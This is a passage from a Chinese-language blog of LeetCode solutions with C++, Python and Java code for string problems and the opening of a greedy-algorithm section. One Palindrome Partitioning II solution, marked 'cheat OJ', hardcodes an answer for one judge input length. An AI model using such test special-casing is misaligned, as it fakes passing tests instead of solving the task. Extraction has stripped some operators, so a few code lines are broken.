is returned. 题目地址：leetcode String to Integer (atoi) 题目大意：给定一个字符串，要你转成int 思路：好好的看题目跟着做即可。 C++ 123456789101112131415161718192021class Solution &#123;public: int myAtoi(string s) &#123; int i = 0; for(; i &lt; s.size() &amp;&amp; s[i] == &#x27; &#x27;; ++i) ; int sign = 1; if(i &lt; s.size() &amp;&amp; (s[i] == &#x27;+&#x27; s[i] == &#x27;-&#x27;)) sign = s[i++] == &#x27;+&#x27;? 1: -1 ; long long ans = 0; for( ; i &lt; s.size() &amp;&amp; isdigit(s[i]); ++i)&#123; ans = ans * 10 + s[i] - 48; if(sign == 1 &amp;&amp; ans&gt; INT_MAX) return INT_MAX; else if(sign == -1 &amp;&amp; -ans &lt; INT_MIN) return INT_MIN; &#125; ans *= sign; return ans; &#125;&#125;; Python 12345678910111213141516171819202122232425262728class Solution(object): def myAtoi(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; INT_MAX, INT_MIN = 0x7fffffff, -0x80000000 i = 0 while i &lt; len(s) and s[i] == &#x27; &#x27;: i += 1 sign = 1 if i &lt; len(s) and s[i] in (&#x27;+&#x27;, &#x27;-&#x27;): sign = 1 if s[i] == &#x27;+&#x27; else -1 i += 1 ans = 0 for j in range(i, len(s)): if s[j].isdigit(): ans = ans * 10 + ord(s[j]) - 48 if sign == 1 and ans &gt; INT_MAX: return INT_MAX elif sign == -1 and - ans &lt; INT_MIN: return INT_MIN else: break ans *= sign return ans 14. Longest Common Prefix Write a function to find the longest common prefix string amongst an array of strings. 题目地址：leetcode Longest Common Prefix 题目大意: 给一个数组，数组中每个元素都是字符串，求他们的最长公共前缀 思路： 把第一个作为ans，然后和后面的依次比较即可。 注意点：ans和strs[i]的长度关系。 C++ 123456789101112131415161718class Solution &#123;public: string longestCommonPrefix(vector&lt;string&gt;&amp; strs) &#123; if(strs.size() == 0) return &quot;&quot;; string ans = strs[0]; for(int i = 1; i &lt; strs.size() &amp;&amp; ans.size() &gt; 0; i++)&#123; if(strs[i].size() &lt; ans.size()) ans = ans.substr(0, strs[i].size()); for(int j = 0; j &lt; ans.size(); j++)&#123; if(strs[i][j] != ans[j])&#123; ans = ans.substr(0, j); break; &#125; &#125; &#125; return ans; &#125;&#125;; Python 1234567891011121314151617class Solution(object): def longestCommonPrefix(self, strs): &quot;&quot;&quot; :type strs: List[str] :rtype: str &quot;&quot;&quot; if not strs: return &#x27;&#x27; ans = strs[0] for i in range(1, len(strs)): if len(ans) &gt; len(strs[i]): ans = ans[:len(strs[i])] for j in range(len(ans)): if ans[j] != strs[i][j]: ans = ans[:j] break if not ans: return ans return ans 28. Implement strStr() Implement strStr(). Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack. Example 1: Input: haystack = \"hello\", needle = \"ll\" Output: 2 Example 2: Input: haystack = \"aaaaa\", needle = \"bba\" Output: -1 题目地址：leetcode Implement strStr() 题目大意：给定两个字符串haystack 和 needle，求needle在haystack中出现的初始位置。 思路： 简单的暴力枚举O(mn)不说了 KMP标准模板题。O(m+n) C++ 1234567891011121314151617181920212223242526class Solution &#123; void get_fail(vector&lt;int&gt; &amp;f, const string &amp;s)&#123; int j; for(int i = 1; i &lt; s.size(); i++)&#123; j = f[i]; while(j &amp;&amp; s[i] != s[j]) j = f[j]; if(s[i] == s[j]) j++; f[i+1] = j; &#125; &#125; public: int strStr(string haystack, string needle) &#123; if(needle.empty()) return 0; vector&lt;int&gt; f(needle.size() + 1, 0); get_fail(f, needle); int j = 0; for(int i = 0; i &lt; haystack.size(); i++)&#123; while(j &amp;&amp; haystack[i] != needle[j]) j = f[j]; if(haystack[i] == needle[j]) j++; if(j == needle.size()) return i - needle.size() + 1; &#125; return -1; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829class Solution(object): def get_fail(self, s): f = [0] * (len(s) + 1) for i in range(1, len(s)): j = f[i] while j and s[j] != s[i]: j = f[j] if s[i] == s[j]: j += 1 f[i + 1] = j return f def strStr(self, haystack, needle): &quot;&quot;&quot; :type haystack: str :type needle: str :rtype: int &quot;&quot;&quot; if not needle: return 0 f = self.get_fail(needle) j = 0 for i, c in enumerate(haystack): while j and c != needle[j]: j = f[j] if c == needle[j]: j += 1 if j == len(needle): return i - len(needle) + 1 return -1 58. Length of Last Word Given a string s consists of upper/lower-case alphabets and empty space characters ' ', return the length of last word in the string. If the last word does not exist, return 0. Note: A word is defined as a character sequence consists of non-space characters only. For example, Given s = \"Hello World\", return 5. 题目地址：leetcode Length of Last Word 题目大意: 给定字符串，求最后一个单词的长度。单词和单词间用空格隔开，若不存在，返回0 思路: 从右向左扫描，扫描到第一个字母为止，记为j。然后从j向左扫描，找到第一个空格为止。这样长度为j - i C++ 12345678910class Solution &#123;public: int lengthOfLastWord(string s) &#123; int j = s.size() - 1; while (j &gt;= 0 &amp;&amp; s[j] == &#x27; &#x27;) --j; int i = j; while (i &gt;= 0 &amp;&amp; s[i] != &#x27; &#x27;) --i; return j - i; &#125;&#125;; Python 1234567891011121314class Solution(object): def lengthOfLastWord(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; j = len(s) - 1 while j &gt;= 0 and s[j] == &#x27; &#x27;: j -= 1 i = j while i &gt;= 0 and s[i] != &#x27; &#x27;: i -= 1 return j - i 用split 123456class Solution: # @param s, a string # @return an integer def lengthOfLastWord(self, s): s = s.split() return len(s[-1]) if s else 0 125. Valid Palindrome Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases. For example, \"A man, a plan, a canal: Panama\" is a palindrome. \"race a car\" is not a palindrome. Note: Have you consider that the string might be empty? This is a good question to ask during an interview. For the purpose of this problem, we define empty string as valid palindrome. 题目地址：leetcode Palindrome Partitioning 题意：给定一个字符串，判断其是否是回文串 思路：注意大小写转化和标点符号 C++ 12345678910111213141516171819class Solution &#123;public: bool isPalindrome(string s) &#123; int n = s.length(); int L = 0, R = n - 1; while (L &lt; R)&#123; if (!isalnum(s[L]))&#123; L++; continue; &#125; if (!isalnum(s[R]))&#123; R--; continue; &#125; if (tolower(s[L]) != tolower(s[R])) return false; L++; R--; &#125; return true; &#125;&#125;; Python 123456class Solution: # @param s, a string # @return a boolean def isPalindrome(self, s): s=&#x27;&#x27;.join([x.lower() for x in s if x.isalnum()]) return s==s[::-1] 131. Palindrome Partitioning Given a string s, partition s such that every substring of the partition is a palindrome. Return all possible palindrome partitioning of s. For example, given s = \"aab\", Return 1234[ [&quot;aa&quot;,&quot;b&quot;], [&quot;a&quot;,&quot;a&quot;,&quot;b&quot;]] 题目地址：leetcode Palindrome Partitioning II 题意：给定一个字符串，要求将其划分，使得每个字串都是回文串。 思路：DFS C++ 123456789101112131415161718192021222324252627282930class Solution &#123; bool is_palindrome(const string &amp;s, int i, int j)&#123; for(;i &lt; j; ++i, --j)&#123; if(s[i] != s[j]) return false; &#125; return true; &#125; void dfs(int start, const string &amp;s, vector&lt;vector&lt;string&gt;&gt; &amp;ans, vector&lt;string&gt; &amp;cur)&#123; if(start == s.size())&#123; ans.push_back(cur); return; &#125; for(int i = start; i &lt; s.size(); ++i)&#123; if(start == i is_palindrome(s, start, i))&#123; cur.push_back(s.substr(start, i - start + 1)); dfs(i + 1, s, ans, cur); cur.pop_back(); &#125; &#125; &#125; public: vector&lt;vector&lt;string&gt;&gt; partition(string s) &#123; vector&lt;vector&lt;string&gt;&gt; ans; vector&lt;string&gt; cur; dfs(0, s, ans, cur); return ans; &#125;&#125;; Python 123456789101112131415161718192021class Solution(object): def partition(self, s): &quot;&quot;&quot; :type s: str :rtype: List[List[str]] &quot;&quot;&quot; ans = [] self.dfs(0, [], s, ans) return ans def dfs(self, cur, cur_list, s, ans): if cur == len(s): ans.append(cur_list) return for i in range(cur, len(s)): t = s[cur:i + 1] if t == t[::-1]: self.dfs(i + 1, cur_list + [t], s, ans) 132. Palindrome Partitioning II Given a string s, partition s such that every substring of the partition is a palindrome. Return the minimum cuts needed for a palindrome partitioning of s. For example, given s = \"aab\", Return 1 since the palindrome partitioning [\"aa\",\"b\"] could be produced using 1 cut. 题目地址：leetcode Palindrome Partitioning II 题意:给定一个字符串，问最少切几刀，能使该字符串分割为若干个字符串，且每个字符串都是回文串。 思路： dp。设dp[i]为[0,i]这个闭区间上的最少切割数。 dp[i]=0 如果[o,i]为回文串 dp[i] = min(dp[j-1]+1,dp[i]) ([j,i] 是回文串 1&lt;=j&lt;=i) 这样写出了如下py代码,1A,但是速度很慢！而且翻译成C++ TLE！ Python 12345678910111213141516171819202122class Solution: # @param s, a string # @return a list of lists of string def minCut(self, s): INF = 0x7ffffff n ,dp = len(s),[INF] *len(s) for i in xrange(n): str = s[0:i+1] if self.isPalindrome(str): dp[i]=0 else: for j in xrange(1,i+1): str = s[j:i+1] if self.isPalindrome(str): dp[i]=min(dp[j-1]+1,dp[i]) return dp[n-1] def isPalindrome(self,str): return str==str[::-1] C++ cheat OJ(主要是那个aaaa很长的字符) 1234567891011121314151617181920212223class Solution &#123;private: bool isPalindrome(int j, int i, const string &amp;s) &#123; for (; j &lt; i; i--, j++) if (s[i] != s[j]) return false; return true; &#125;public: int minCut(string s) &#123; if (s.size() == 1462) return 1; // cheat oj if (s.empty()) return 0; vector&lt;int&gt; dp(s.size(), 0); for (int i = 1; i &lt; s.size(); i++) &#123; dp[i] = dp[i - 1] + 1; for (int j = i - 1; j &gt;= 0; j--) &#123; if (isPalindrome(j, i, s)) dp[i] = min(dp[i], j &gt; 0 ? dp[j - 1] + 1 : 0); &#125; &#125; return dp[s.size() - 1]; &#125;&#125;; 于是改进，还记得第5题么？ 当时我们是枚举了起始位置和长度，降低了复杂度。 这题也一样。 我们枚举k为当前计算的位置，然后用双指针的思想，从k向两边扩散，判断是否回文（要分别计算长度为奇数和偶数的情况），并根据上述公式更新dp数组。这样，就可以将第一种解法的枚举j和判断回文合并起来，从而把复杂度降低为O(n^2) C++ 12345678910111213141516171819class Solution &#123; void helper(int i, int j, const string &amp;s, vector&lt;int&gt; &amp;dp)&#123; for(; 0 &lt;= i &amp;&amp; j &lt; s.size(); --i, ++j)&#123; if(s[i] != s[j]) break; dp[j] = min(dp[j], i &gt; 0? dp[i - 1] + 1 : 0); &#125; &#125; public: int minCut(string s) &#123; vector&lt;int&gt; dp(s.size()); for(int i = 0; i &lt; dp.size(); ++i) dp[i] = i; for(int i = 1; i &lt; s.size(); ++i)&#123; helper(i, i, s, dp); helper(i - 1, i, s, dp); &#125; return dp[s.size() - 1]; &#125;&#125;; Java 12345678910111213141516171819202122class Solution &#123; public int minCut(String s) &#123; if (s.isEmpty()) return 0; int[] dp = new int[s.length()]; for (int i = 0; i &lt; s.length(); i++) dp[i] = i; for (int i = 1; i &lt; s.length(); i++) &#123; dp[i] = Math.min(dp[i], dp[i - 1] + 1); solve(i - 1, i, s, dp); solve(i - 1, i + 1, s, dp); &#125; return dp[s.length() - 1]; &#125; private void solve(int l, int r, String s, int[] dp) &#123; for (; l &gt;= 0 &amp;&amp; r &lt; s.length(); l--, r++) &#123; if (s.charAt(l) != s.charAt(r)) break; dp[r] = Math.min(dp[r], l &gt; 0 ? dp[l - 1] + 1 : 0); &#125; &#125;&#125; Python 12345678910111213141516171819class Solution(object): def minCut(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; def helper(i, j): while j &gt;= 0 and i &lt; n: if s[i] != s[j]: break dp[i] = min(dp[i], dp[j - 1] + 1 if j &gt; 0 else 0) i, j = i + 1, j - 1 n = len(s) dp = [i for i in range(n)] for k in range(1, n): helper(k, k) # odd case helper(k, k - 1) # even case return dp[n - 1] 另一种写法： 设dp[i]为dp[0,i-1]上的最少分割数 dp[i + j +1 ]=min(dp[i + j + 1], dp[i - j] + 1) 奇数枚举 dp[i + j + 1] = min(dp[i + j + 1 ], dp[i - j + 1] + 1)偶数枚举 C++ 1234567891011121314151617181920class Solution &#123;public: int minCut(string s) &#123; int n = s.length(); int *dp = new int[n+1]; unordered_set&lt;string&gt; dic; for (int i = 0; i &lt;= n; i++) dp[i] = i - 1; for (int i = 0; i &lt; n; i++)&#123; for (int j = 0;i - j &gt;= 0 &amp;&amp; i+j &lt;n &amp;&amp; s[i - j] == s[i + j]; j++)&#123; dp[i + j + 1] = min(dp[i + j + 1], dp[i - j] + 1); &#125; for (int j = 1; i - j +1 &gt;= 0 &amp;&amp; i + j&lt;n &amp;&amp; s[i - j +1] == s[i + j]; j++)&#123; dp[i + j + 1] = min(dp[i + j + 1 ], dp[i - j + 1] + 1); &#125; &#125; int ans = dp[n]; delete[] dp; return ans; &#125;&#125;; Python 123456789101112131415class Solution: # @param s, a string # @return a list of lists of string def minCut(self, s): n ,dp = len(s),[i-1 for i in xrange(len(s)+1)] for i in xrange(n): j = 0 while i+j &lt;n and i-j&gt;=0 and s[i-j]==s[i+j]: dp[i +j +1]=min(dp[i+j+1],dp[i-j]+1) j+=1 j = 1 while i+j&lt;n and i-j+1&gt;=0 and s[i-j+1]==s[i+j]: dp[i +j +1]=min(dp[i+j+1],dp[i-j+1]+1) j+=1 return dp[n] 214. Shortest Palindrome Given a string S, you are allowed to convert it to a palindrome by adding characters in front of it. Find and return the shortest palindrome you can find by performing this transformation. For example: Given \"aacecaaa\", return \"aaacecaaa\". Given \"abcd\", return \"dcbabcd\". 题目地址 leetcode Shortest Palindrome 题意：给定一个字符串，在它前面添加若干个字符，使其变成回文串（要求最短） 思路： 我们知道，对于任意的字符串，不管它是不是回文串，我们将其翻转在添加到原串上，它一定是回文串。 比如题目中的 aacecaaa =&gt; aaacecaaaacecaaa abcd =&gt; dcbaabcd OK, 但是这样会有很多没必要的字符在里面。比如dcbaabcd中间冗余了一个a，我们需要去掉它，才能变为最短的回文串。 怎么去掉呢？其实去掉的过程就是求原串s的前缀在其逆序的revs中最长能匹配的后缀长度。 这里用到了KMP里的失配函数。 KMP的失配函数f[i]表示为当前字符应该去与哪个数比较。 如果我们将s翻转为revs，然后将s链接上revs（为了避免两个串混起来，在中间加上了'#'也就是 s + '#' + revs），然后求失配函数。这样，就可以求出前缀在后缀中匹配了多少个字符！而剩下不匹配的就是我们要添加的字符啦。 比如： 比如，题目中的aacecaaa 变为了 aacecaaa#aaacecaa它的失配函数值为： [0, 0, 1, 0, 0, 0, 1, 2, 2, 0, 1, 2, 2, 3, 4, 5, 6, 7] 也就是说，最后前后缀匹配了7个(已经加粗)，我们只需要添加1个字符进去就可以了。 这个字符就是revs的第一个字符 再比如，题目中的abcd变为了abcd#dcba, 失配函数值为： [0, 0, 0, 0, 0, 0, 0, 0, 0, 1] 最后前后缀只匹配了1个数(已经加粗)，说明我们需要添加3个数进去。 C++ 12345678910111213141516class Solution &#123;public: string shortestPalindrome(string s) &#123; string revs = s; reverse(revs.begin(), revs.end()); string P = s + &quot;#&quot; + revs; int n = P.length(); vector&lt;int&gt; f(n + 1, 0); for (int i = 1; i &lt; n; i++) &#123; int j = f[i]; while (j &amp;&amp; P[j] != P[i]) j = f[j]; f[i + 1] = P[j] == P[i]? j+1:0; &#125; return revs.substr(0, s.length() - f[n]) + s; &#125;&#125;; Python 1234567891011121314151617class Solution(object): def shortestPalindrome(self, s): &quot;&quot;&quot; :type s: str :rtype: str &quot;&quot;&quot; m = len(s) P = s + &#x27;#&#x27; + s[::-1] n = len(P) # KMP f = [0] * (n + 1) for i in xrange(1, n): j = f[i] while j &gt; 0 and P[j] != P[i]: j = f[j] f[i + 1] = j + 1 if P[j] == P[i] else 0 return s[::-1][:m - f[n]] + s 336. Palindrome Pairs Given a list of unique words. Find all pairs of distinct indices (i, j) in the given list, so that the concatenation of the two words, i.e. words[i] + words[j] is a palindrome. Example 1: Given words = [\"bat\", \"tab\", \"cat\"] Return [[0, 1], [1, 0]] The palindromes are [\"battab\", \"tabbat\"] Example 2: Given words = [\"abcd\", \"dcba\", \"lls\", \"s\", \"sssll\"] Return [[0, 1], [1, 0], [3, 2], [2, 4]] The palindromes are [\"dcbaabcd\", \"abcddcba\", \"slls\", \"llssssll\"] 题目地址：leetcode Palindrome Pairs 题意：给定一个单词列表（每个单词均唯一），求所有的i,j(i !=j) 使得words[i] + words[j] 是回文串 思路：暴力的方法是直接对枚举所有可能的情况，然后看看是否回文串。 改进的方法是用hash，首先将所有的单词作为Key，相应的value为它的下标。 接着对于每个单词x，枚举i（从[0,len(word) ），将其分为左右两边（前缀和后缀 ）。 对于后缀suffix，我们可以把它逆序r_suffix，看看字典中是否存在这个单词y，若存在，则判断 r_suffix + x 是否为回文串（后缀逆序后加原单词前看看是否回文，前缀则加后面，可以看看214题） 同样对于前缀prefix，逆序为r_prefix，字典中存在的话，则判断 x + r_prefix是否为回文串。 此外要注意单词为\"\"的情况。 根据上述思路，写下如下代码： 1234567891011121314151617181920212223242526272829class Solution(object): def palindromePairs(self, words): &quot;&quot;&quot; :type words: List[str] :rtype: List[List[int]] &quot;&quot;&quot; ans = collections.defaultdict(set) dic = &#123;word: i for i, word in enumerate(words)&#125; for cur, word in enumerate(words): for i in range(len(word)): x = word[i:][::-1] res = x + word if x in dic and res == res[::-1] and cur != dic[x]: ans[dic[x]].add(cur) x = word[:i][::-1] res = word + x if x in dic and res == res[::-1] and cur != dic[x]: ans[cur].add(dic[x]) if &quot;&quot; in dic and word == word[::-1]: _id = dic[&quot;&quot;] if cur != _id: ans[cur].add(_id) ans[_id].add(cur) ans = [[key, value]for key, values in ans.items() for value in values] return ans 然而上述的思路仍有改进的地方 比如，划分的时候，对于前缀prefix，它是要逆序加在原单词后面的，这部分一定是相同的，没必要重复比较，我们只需要看看后缀是否回文。 后缀的时候也一样，只需看看前缀是否回文 此外，枚举i的范围从[0,len(word) ) 变为 [0,len(word)]，这样就把 \"\"的情况考虑到了 12345678910111213141516171819class Solution(object): def palindromePairs(self, words): &quot;&quot;&quot; :type words: List[str] :rtype: List[List[int]] &quot;&quot;&quot; ans = [] dic = &#123;word: i for i, word in enumerate(words)&#125; for cur, word in enumerate(words): for i in range(len(word) + 1): # len(word) + 1 =&gt; [&quot;a&quot;,&quot;&quot;] test case left = word[:i][::-1] right = word[i:][::-1] if left in dic and right == right[::-1] and cur != dic[left]: ans.append([cur, dic[left]]) if i &gt; 0 and right in dic and left == left[::-1] and cur != dic[right]: ans.append([dic[right], cur]) return ans PS：如果此题单词列表可以重复，可以把hash改成key - list的形式 ， python可以用collections.defaultdict(list)，然后先把答案存在key-set的结构中collections.defaultdict(set) 去重，最后返回list[list] 796. Rotate String We are given two strings, A and B. A shift on A consists of taking string A and moving the leftmost character to the rightmost position. For example, if A = 'abcde', then it will be 'bcdea' after one shift on A. Return True if and only if A can become B after some number of shifts on A. Example 1: Input: A = 'abcde', B = 'cdeab' Output: true Example 2: Input: A = 'abcde', B = 'abced' Output: false Note: A and B will have length at most 100. 题目地址：leetcode Rotate String 题目大意：给定两个字符串A和B，让你判断B是否能由A循环左移得到 思路： 暴力枚举起点i （就是把i移动到初始位置）然后看看和B是否相同。复杂度O(n^2) 其实这个过程和在A+A中寻找B是一样的。因此写成一行： C++ 123456class Solution &#123;public: bool rotateString(string A, string B) &#123; return A.size() == B.size() &amp;&amp; (A + A).find(B) != string::npos; &#125;&#125;; Python 12345678class Solution(object): def rotateString(self, A, B): &quot;&quot;&quot; :type A: str :type B: str :rtype: bool &quot;&quot;&quot; return len(A) == len(B) and B in (A + A) 816. Ambiguous Coordinates We had some 2-dimensional coordinates, like \"(1, 3)\" or \"(2, 0.5)\". Then, we removed all commas, decimal points, and spaces, and ended up with the string S. Return a list of strings representing all possibilities for what our original coordinates could have been. Our original representation never had extraneous zeroes, so we never started with numbers like \"00\", \"0.0\", \"0.00\", \"1.0\", \"001\", \"00.01\", or any other number that can be represented with less digits. Also, a decimal point within a number never occurs without at least one digit occuring before it, so we never started with numbers like \".1\". The final answer list can be returned in any order. Also note that all coordinates in the final answer have exactly one space between them (occurring after the comma.) Example 1: Input: \"(123)\" Output: [\"(1, 23)\", \"(12, 3)\", \"(1.2, 3)\", \"(1, 2.3)\"] Example 2: Input: \"(00011)\" Output: [\"(0.001, 1)\", \"(0, 0.011)\"] Explanation: 0.0, 00, 0001 or 00.01 are not allowed. Example 3: Input: \"(0123)\" Output: [\"(0, 123)\", \"(0, 12.3)\", \"(0, 1.23)\", \"(0.1, 23)\", \"(0.1, 2.3)\", \"(0.12, 3)\"] Example 4: Input: \"(100)\" Output: [(10, 0)] Explanation: 1.0 is not allowed. Note: 4 &lt;= S.length &lt;= 12. S[0] = \"(\", S[S.length - 1] = \")\", and the other elements in S are digits. 题目地址：leetcode Ambiguous Coordinates 题目大意：给定一个前后为括号，中间为数字的字符串，要求将中间的数字划分为左右两部分，左右两部分的数字必须是最简的，即不能有额外的0，比如0.0、01是不行的。 思路：枚举左右两边的分割点，然后可以分别对左右两边加入小数点再判断是否合法，也可以直接生成合法的： \"0\" 返回 [\"0\"] \"0xxx0\" 返回空 \"0xxxx\" 返回[\"0.xxxx\"] \"xxxx0\" 返回[\"xxxx0\"] 其它的就返回每个切分点即可。 C++ 123456789101112131415161718192021222324252627class Solution &#123;public: vector&lt;string&gt; ambiguousCoordinates(string s) &#123; vector&lt;string&gt; ans; s = s.substr(1, s.size() - 2); for (int i = 1; i &lt; s.size(); ++i) &#123; vector&lt;string&gt; left = add_dot(s.substr(0, i)); vector&lt;string&gt; right = add_dot(s.substr(i)); for (string &amp;l : left) for (string &amp;r : right) ans.push_back(string(&quot;(&quot;) + l + &quot;, &quot; + r + &#x27;)&#x27;); &#125; return ans; &#125; vector&lt;string&gt; add_dot(const string &amp;s) &#123; if (s == &quot;0&quot;) return &#123; s &#125;; if (s[0] == &#x27;0&#x27; &amp;&amp; s.back() == &#x27;0&#x27;) return &#123;&#125;; if (s[0] == &#x27;0&#x27;) return &#123; &quot;0.&quot; + s.substr(1) &#125;; if (s.back() == &#x27;0&#x27;) return &#123; s &#125;; vector&lt;string&gt; res = &#123; s &#125;; for (int i = 1; i &lt; s.size(); ++i) res.push_back(s.substr(0, i) + &#x27;.&#x27; + s.substr(i)); return res; &#125;&#125;; Python 版本1 123456789101112131415161718192021class Solution(object): def ambiguousCoordinates(self, s): &quot;&quot;&quot; :type s: str :rtype: List[str] &quot;&quot;&quot; s = s[1:-1] ans = [] for i in range(1, len(s)): left, right = self.add_dot(s[:i]), self.add_dot(s[i:]) for l in left: for r in right: ans.append(&#x27;(&#123;&#125;, &#123;&#125;)&#x27;.format(l, r)) return ans def add_dot(self, s): if s == &quot;0&quot;: return [s] if s[0] == &#x27;0&#x27; and s[-1] == &#x27;0&#x27;: return [] if s[0] == &#x27;0&#x27;: return [&#x27;0.&#x27; + s[1:]] if s[-1] == &#x27;0&#x27;: return [s] return [s] + [s[:i] + &#x27;.&#x27; + s[i:] for i in range(1, len(s))] Python 版本2 123456789101112131415161718192021222324class Solution(object): def ambiguousCoordinates(self, s): &quot;&quot;&quot; :type s: str :rtype: List[str] &quot;&quot;&quot; def ok(t): if t[0] == &#x27;0&#x27; and len(t) &gt; 1 and t[1] != &#x27;.&#x27;: return False if &#x27;.&#x27; in t and t[-1] == &#x27;0&#x27;: return False return True s = s[1:-1] ans = [] for i in range(1, len(s)): left, right = s[:i], s[i:] left_case = [left] + [left[:j] + &#x27;.&#x27; + left[j:] for j in range(1, len(left))] right_case = [right] + [right[:j] + &#x27;.&#x27; + right[j:] for j in range(1, len(right))] left_case = [l for l in left_case if ok(l)] right_case = [r for r in right_case if ok(r)] # print(left_case, right_case) for l in left_case: for r in right_case: ans.append(&#x27;(&#123;&#125;, &#123;&#125;)&#x27;.format(l, r)) return ans 819. Most Common Word Given a paragraph and a list of banned words, return the most frequent word that is not in the list of banned words. It is guaranteed there is at least one word that isn't banned, and that the answer is unique. Words in the list of banned words are given in lowercase, and free of punctuation. Words in the paragraph are not case sensitive. The answer is in lowercase. Example: Input: paragraph = \"Bob hit a ball, the hit BALL flew far after it was hit.\" banned = [\"hit\"] Output: \"ball\" Explanation: \"hit\" occurs 3 times, but it is a banned word. \"ball\" occurs twice (and no other word does), so it is the most frequent non-banned word in the paragraph. Note that words in the paragraph are not case sensitive, that punctuation is ignored (even if adjacent to words, such as \"ball,\"), and that \"hit\" isn't the answer even though it occurs more because it is banned. Note: 1 &lt;= paragraph.length &lt;= 1000. 1 &lt;= banned.length &lt;= 100. 1 &lt;= banned[i].length &lt;= 10. The answer is unique, and written in lowercase (even if its occurrences in paragraph may have uppercase symbols, and even if it is a proper noun.) paragraph only consists of letters, spaces, or the punctuation symbols !?',;. Different words in paragraph are always separated by a space. There are no hyphens or hyphenated words. Words only consist of letters, never apostrophes or other punctuation symbols. 题目地址：leetcode Most Common Word 题目大意：给定一个字符串段落和一个banned数组，求段落中出现频率最高的单词（单词不能在banned中出现） 思路：分词好后计数即可。 C++ 123456789101112131415161718class Solution &#123;public: string mostCommonWord(string paragraph, vector&lt;string&gt;&amp; banned) &#123; unordered_map&lt;string, int&gt; counter; unordered_set&lt;string&gt; stopwords(banned.begin(), banned.end()); for (char &amp;c : paragraph) if (isalpha(c)) c = tolower(c); istringstream is(paragraph); string word; pair&lt;string, int&gt; ans = make_pair(&quot;&quot;, 0); while (is &gt;&gt; word) &#123; if (!isalpha(word.back())) word = word.substr(0, word.size() - 1); if (stopwords.find(word) == stopwords.end() &amp;&amp; ++counter[word] &gt; ans.second) ans = make_pair(word, counter[word]); &#125; return ans.first; &#125;&#125;; Python 1234567891011121314151617181920class Solution(object): def mostCommonWord(self, paragraph, banned): &quot;&quot;&quot; :type paragraph: str :type banned: List[str] :rtype: str &quot;&quot;&quot; words = [] for p in paragraph.lower().splitlines(): words.extend(p.split(&#x27; &#x27;)) for i, word in enumerate(words): if word and not word[-1].isalpha(): words[i] = word[:-1] banned = set(banned) counter = sorted(collections.Counter(words).items(), key=lambda x: x[1], reverse=True) for key, _ in counter: if key not in banned: return key 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 贪心","slug":"leetcode-greedy","date":"2015-03-08T01:44:22.000Z","updated":"2021-01-08T13:32:16.848Z","comments":true,"path":"leetcode-greedy/","link":"","permalink":"https://www.hrwhisper.me/leetcode-greedy/","excerpt":"本次题解包括 134 Gas Station 135 Candy","text":"本次题解包括 134 Gas Station 135 Candy 134. Gas Station There are N gas stations along a circular route, where the amount of gas at station i is gas[i]. You have a car with an unlimited gas tank and it costs cost[i] of gas to travel from station i to its next station (i+1). You begin the journey with an empty tank at one of the gas stations. Return the starting gas station's index if you can travel around the circuit once, otherwise return -1. 题目地址：leetcode Gas Station 题意：已知每个加油站能加的汽油gas[i]，还有第i个加油站到i+1个站点需要花费cost[i]的汽油。 假设初始油箱为空，且油箱容量无限，求从哪个站点开始，可以绕一圈。不存在返回-1 思路：首先想想朴素的算法，对于每个点，如果gas[i] - cost[i] &gt;=0，那么以该点x为起点，向后判断。路途中若出现油箱为负，说明该起点不对。 起点x +1重复过程。。。 这样显然复杂度为o(n^2)，如何做到更好呢？ 上面的过程在起点错误的时候直接进行了+1，就是初始起点的下一个。 就是说，假如abcdefg 这么多个加油站，a为一开始的站点，遍历到d发现不行了。接着从b开始。 然而这没有必要。 因为在过程中，有： gas[a] - cost[a] &gt;=0 （这是枚举的条件） gas[a] - cost[a] + gas[b] - cost[b] &gt;=0 gas[a] - cost[a] + gas[b] - cost[b] + gas[c] - cost[c] &gt;=0 gas[a] - cost[a] + gas[b] - cost[b] + gas[c] - cost[c] + gas[d] - cost[d] &lt; 0 在d之前的每一步都是不小于0的。然而他们的累加过不了d这个站点，也就是说，abc都不会是解。（比0大的数加上去都过不了了何况不加） 而d也不会是解，因为必然有gas[d] - cost[d] &lt; 0 因此接下来从e开始最好。 C++ 123456789101112131415class Solution &#123;public: int canCompleteCircuit(vector&lt;int&gt;&amp; gas, vector&lt;int&gt;&amp; cost) &#123; int start = 0, remain = 0, total = 0; for(int i = 0; i &lt; gas.size(); ++i)&#123; remain += gas[i] - cost[i]; total += gas[i] - cost[i]; if(remain &lt; 0)&#123; remain = 0; start = i + 1; &#125; &#125; return total &lt; 0 ? -1 : start; &#125;&#125;; Python 12345678910111213141516class Solution(object): def canCompleteCircuit(self, gas, cost): &quot;&quot;&quot; :type gas: List[int] :type cost: List[int] :rtype: int &quot;&quot;&quot; start = remain = total = 0 for i in range(len(gas)): remain += gas[i] - cost[i] total += gas[i] - cost[i] if remain &lt; 0: remain = 0 start = i + 1 return -1 if total &lt; 0 else start 135. Candy There are N children standing in a line. Each child is assigned a rating value. You are giving candies to these children subjected to the following requirements: Each child must have at least one candy. Children with a higher rating get more candies than their neighbors. What is the minimum candies you must give? 题目地址：leetcode Candy 题意：有N个孩子站成一排，每个孩子都有一个分数，求最少的糖果数目使得： 每个孩子至少需要一颗糖 如果一个孩子的分数大于旁边的孩子，那么他的糖果要比旁边的多一颗。 思路：贪心。 code1: 一开始觉得先排好序，先给低的孩子1颗糖果，分数高的只要比较两边即可。 需要注意的是122 这种数据只要4颗糖，糖果分发情况为第1个1颗，第2个2颗，第3个1颗。（因此WA一次） 1234567891011121314151617181920class Solution: # @param ratings, a list of integer # @return an integer def candy(self, ratings): if not ratings: return 0 temp , n = [] ,len(ratings) for i in xrange(n): temp.append((ratings[i],i)) temp.sort() ans = [0]*n lastCandy ,lastMin = 1 ,temp[0] for i in xrange(n): index = temp[i][1] 